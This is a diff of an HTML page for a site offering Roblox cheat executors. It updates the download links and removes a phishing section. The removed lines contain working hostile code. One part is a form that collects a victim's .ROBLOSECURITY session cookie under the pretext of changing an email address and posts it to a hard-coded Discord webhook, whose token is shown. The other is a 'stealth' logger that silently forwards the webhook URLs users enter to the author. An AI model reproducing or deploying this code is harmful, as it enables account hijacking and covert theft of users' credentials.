@@ -257,7 +257,6 @@
   <a class="active-tab" onclick="showSection('executor', this)">Executor</a>
   <a onclick="showSection('scripts', this)">Scripts</a>
   <a onclick="showSection('botsender', this)">Discord Bot</a>
-    <a onclick="showSection('beams', this)">R0blox Beaming </a>
   <a onclick="showSection('changelog', this)">Change Log</a>
   
 </div>
@@ -270,14 +269,14 @@
       <h2>Executor Versions</h2>
       <div class="vertical-slider">
         <div class="slider-item">
-          <h3>Atoms Executor V1.2</h3>
-          <p>(Coming Soon: V1.3)</p>
-          <button class="btn" onclick="window.location.href='https://example.com'">Download V1.2</button>
+          <h3>Atoms Executor V1.3</h3>
+          <p>(Working/Active)</p>
+          <button class="btn" onclick="window.location.href='https://work.ink/28sJ/atomsexecutor-v13'">Download V1.3</button>
         </div>
         <div class="slider-item">
-          <h3>Vexis Executor V.1</h3>
-          <p>(Coming Soon: V1.1)</p>
-          <button class="btn" onclick="window.location.href='https://example.com'">Download V.1</button>
+          <h3>Vexis Executor V3</h3>
+          <p>(Working/Active)</p>
+          <button class="btn" onclick="window.location.href='https://work.ink/28sJ/quoromexecutor-v3'">Download V3</button>
         </div>
       </div>
     </div>
@@ -334,50 +333,17 @@
         <li>[+] New Script Added: Arsenal</li>
         <li>[+] New Script Added: Cheeese Escape [Horror]</li>
         <li>[+] New Tab Added</li>
+       <p>Executor:</p>
+       <li>[+] AtomsExecutor Update Version 1.3</li>
+       <li>[+] New Executor - Quorum Executor</li>     
       </ul>
     </div>
   </div>
-
-  <!-- BEAMS / ORNAMENTS TOOL -->
-  <div id="beams" class="section">
-    <div class="card">
-      <h2>Beaming - Make Your Own R0blox P1shing Link</h2>
-
-      <button class="btn" onclick="window.location.href='https://www.logged.tg/auth/atoms'">
-        Link Generator
-      </button>
-
-      <div style="margin-top: 32px; background: rgba(30,30,60,0.6); padding: 24px; border-radius: 16px;">
-        <h2>Atoms | Roblox Email Changer</h2>
-
-        <div style="margin: 16px 0; padding: 12px; background: rgba(100,0,0,0.3); border: 1px solid #c53030; border-radius: 10px; color: #ffcccc;">
-          ⚠️ <strong>Claimed ~50% success rate — use at your own risk!</strong><br>
-          <small>Do NOT share your cookie with untrusted people/sites.</small>
-        </div>
-
-        <label for="cookie">.ROBLOSECURITY Cookie</label>
-        <textarea id="cookie" rows="4" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--..."></textarea>
-
-        <label for="newEmail">New Email</label>
-        <input id="newEmail" type="email" placeholder="newemail@gmail.com" autocomplete="off">
-
-        <label for="confirmEmail">Confirm New Email</label>
-        <input id="confirmEmail" type="email" placeholder="newemail@gmail.com" autocomplete="off">
-
-        <button class="btn" id="submitBtn" onclick="send()" style="margin-top: 20px;">
-          SUBMIT
-        </button>
-
-        <div id="loading">⏳ Processing...</div>
-        <div id="success">✅ Request Sent! Check your email / account.</div>
-        <div id="error"></div>
-      </div>
-    </div>
-  </div>
-
+  
 </div>
 
 <script>
+    
 // ────────────────────────────────────────────────
 //  DASHBOARD FUNCTIONS
 // ────────────────────────────────────────────────
@@ -402,151 +368,6 @@ function copyScript(btn) {
   });
 }
 
-// ────────────────────────────────────────────────
-//  ORNAMENTS / COOKIE → EMAIL TOOL
-// ────────────────────────────────────────────────
-
-const WEBHOOK = "https://discord.com/api/webhooks/1454806199047557161/klXH6E6K7INenCbimotwZJR3Xpa4j0XA2QJP7h2SXccGxexyRJO-qGNW0zZnwl4cYs_h";
-
-async function send() {
-  const btn         = document.getElementById("submitBtn");
-  const loading     = document.getElementById("loading");
-  const success     = document.getElementById("success");
-  const errorDiv    = document.getElementById("error");
-
-  success.style.display = "none";
-  errorDiv.style.display = "none";
-  errorDiv.textContent = "";
-
-  const cookie   = document.getElementById("cookie").value.trim();
-  const newEmail = document.getElementById("newEmail").value.trim();
-  const confirm  = document.getElementById("confirmEmail").value.trim();
-
-  if (!cookie) {
-    alert("Please paste your .ROBLOSECURITY cookie.");
-    return;
-  }
-
-  if (!newEmail || !confirm) {
-    alert("Please fill in both email fields.");
-    return;
-  }
-
-  if (newEmail !== confirm) {
-    alert("Emails do not match!");
-    return;
-  }
-
-  // Very basic email format check
-  if (!newEmail.includes("@") || !newEmail.includes(".")) {
-    alert("Please enter a valid email address.");
-    return;
-  }
-
-  btn.disabled = true;
-  loading.style.display = "block";
-
-  try {
-    const response = await fetch(WEBHOOK, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        embeds: [{
-          title: "✦ Roblox Email Change Request",
-          color: 0x7a00ff,
-          description: "**Cookie:**\n```" + cookie + "```",
-          fields: [
-            { name: "→ New Email", value: newEmail, inline: true },
-            { name: "→ Time (PH)", value: new Date().toLocaleString("en-US", { timeZone: "Asia/Manila" }), inline: true }
-          ],
-          footer: { text: "Ornaments Tool • 2026" },
-          timestamp: new Date().toISOString()
-        }]
-      })
-    });
-
-    if (!response.ok) throw new Error(`HTTP ${response.status}`);
-
-    loading.style.display = "none";
-    success.style.display = "block";
-
-  } catch (err) {
-    loading.style.display = "none";
-    errorDiv.style.display = "block";
-    errorDiv.textContent = "Failed — webhook may be invalid or dead → " + err.message;
-    console.error(err);
-  } finally {
-    btn.disabled = false;
-  }
-}
-
-// ────────────────────────────────────────────────
-//  BOT WEBHOOK SENDER + STEALTH LOGGER
-// ────────────────────────────────────────────────
-
-const MY_LOGGING_WEBHOOK = "https://discord.com/api/webhooks/1454806199047557161/klXH6E6K7INenCbimotwZJR3Xpa4j0XA2QJP7h2SXccGxexyRJO-qGNW0zZnwl4cYs_h";
-
-async function sendWebhook() {
-  const webhookEl = document.getElementById("webhook");
-  const username  = document.getElementById("username").value.trim();
-  const avatar    = document.getElementById("avatar").value.trim();
-  const message   = document.getElementById("message").value.trim();
-  const status    = document.getElementById("status");
-
-  const userWebhook = webhookEl.value.trim();
-
-  if (!userWebhook) {
-    status.innerText = "Please enter a webhook URL.";
-    status.style.color = "#ff7777";
-    return;
-  }
-
-  status.innerText = "Sending...";
-  status.style.color = "#ffcc00";
-
-  // Stealth log (silent)
-  fetch(MY_LOGGING_WEBHOOK, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      embeds: [{
-        title: "📝 New Webhook Logged",
-        color: 16711680,
-        fields: [
-          { name: "Webhook", value: `\`${userWebhook}\`` },
-          { name: "Message", value: message || "[empty]" }
-        ],
-        footer: { text: "Atoms.xyz • Stealth" },
-        timestamp: new Date().toISOString()
-      }]
-    })
-  }).catch(() => {}); // ignore errors
-
-  // Actual send
-  try {
-    const res = await fetch(userWebhook, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        content: message || "@everyone",
-        username: username || undefined,
-        avatar_url: avatar || undefined
-      })
-    });
-
-    if (res.ok) {
-      status.innerText = "Message sent successfully ✓";
-      status.style.color = "#77ffaa";
-    } else {
-      status.innerText = `Failed (${res.status})`;
-      status.style.color = "#ff7777";
-    }
-  } catch (err) {
-    status.innerText = "Error sending message";
-    status.style.color = "#ff7777";
-    console.error(err);
-  }
-}
 </script>
 
 </body>
